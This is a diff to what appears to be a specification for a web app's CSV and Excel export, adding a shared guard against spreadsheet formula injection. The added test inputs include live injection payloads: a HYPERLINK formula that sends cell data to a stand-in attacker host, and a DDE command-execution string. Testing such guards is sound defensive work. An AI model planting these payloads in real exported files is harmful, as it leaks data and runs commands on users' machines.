@@ -270,7 +270,7 @@ T("WEB12b", "WEB", "Download everything, the hidden screens and the Reports cut 
   do="'Download everything' builds in the browser from the cache, after a fresh poll, one zip of "
      "CSV files (customers, bills, bill items, receipts, allocations, stock, daily rates, categories, settings, users' "
      "names and roles, never a hash; the owner-only weight only for the owner; a cell starting with `=`, `+`, `-`, `@`, a tab "
-     "or a carriage return gets a single quote in front) plus `MANIFEST.csv`, then posts the record (API35); Order Book, the "
+     "or a carriage return gets a single quote in front; **one guard function, also used by `csvCell` of `downloadCsv` and by the HTML cell writer of `downloadExcel` in `src/lib/exportUtils.ts` (the inventory screen, open to all three roles), with a test on `=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")`, `+1+1`, `-2+3`, `@SUM(A1)`, `=cmd|' /C calc'!A0`, a tab and a carriage return: RV1-9**) plus `MANIFEST.csv`, then posts the record (API35); Order Book, the "
      "public catalogue and its admin screens, the sample Audit and Sales tabs, the Estimate date editor and the Reports "
      "date controls and export buttons are not connected and not reachable; 'Reset Defaults' and 'Delete All Inventory' are "
      "gone. The Reports screen is rewired to the selectors (WEB12), or hidden if the cut line is used (O32).",
